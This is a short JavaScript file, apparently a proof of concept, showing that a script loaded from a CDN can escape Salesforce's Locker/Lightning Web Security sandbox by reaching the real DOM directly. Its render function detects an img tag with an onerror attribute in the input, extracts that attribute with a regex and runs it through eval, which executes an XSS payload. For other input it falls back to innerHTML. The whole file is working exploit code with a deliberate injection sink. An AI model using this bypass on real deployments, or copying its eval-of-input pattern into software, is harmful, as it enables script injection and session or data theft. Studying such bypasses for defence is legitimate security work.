/**
 * CDN Script: Bypasses Locker by accessing real DOM directly
 * Demonstrates that external scripts can bypass Locker/LWS when accessing DOM independently
 */
window.CdnRenderer = {
    render: function(el, html) {
        console.log('[CDN] render() called');
        console.log('[CDN] HTML payload:', html);

        const realElement = document.getElementById('xss-real-dom-output');

        if (realElement) {
            console.log('[CDN] Found real DOM element via document.getElementById');
            console.log('[CDN] Bypassing Locker by creating elements and setting event handlers via JS');

            // Clear previous content
            realElement.textContent = '';

            // Add header
            const header = document.createElement('strong');
            header.style.color = 'red';
            header.textContent = '🔴 Real DOM Output (CDN Bypass)';
            realElement.appendChild(header);
            realElement.appendChild(document.createElement('br'));

            // Manual XSS bypass: Create img element and set onerror via JS (not HTML parsing)
            // This is what worked in your console test!
            if (html.includes('<img') && html.includes('onerror')) {
                console.log('[CDN] Detected XSS payload - executing via createElement + JS event handler');

                const img = document.createElement('img');
                img.src = 'x'; // Invalid src to trigger error
                img.onerror = function() {
                    eval(html.match(/onerror="([^"]+)"/)[1]);
                };
                realElement.appendChild(img);

                console.log('[CDN] ✅ Bypassed Locker - XSS executed via JS property assignment');
            } else {
                // For non-XSS content, just display as text
                const text = document.createTextNode(html);
                realElement.appendChild(text);
            }
        } else {
            console.error('[CDN] Could not find real DOM element');
            el.innerHTML = html;
        }
    }
};

console.log('[CDN] cdn-renderer-bypass.js loaded successfully');
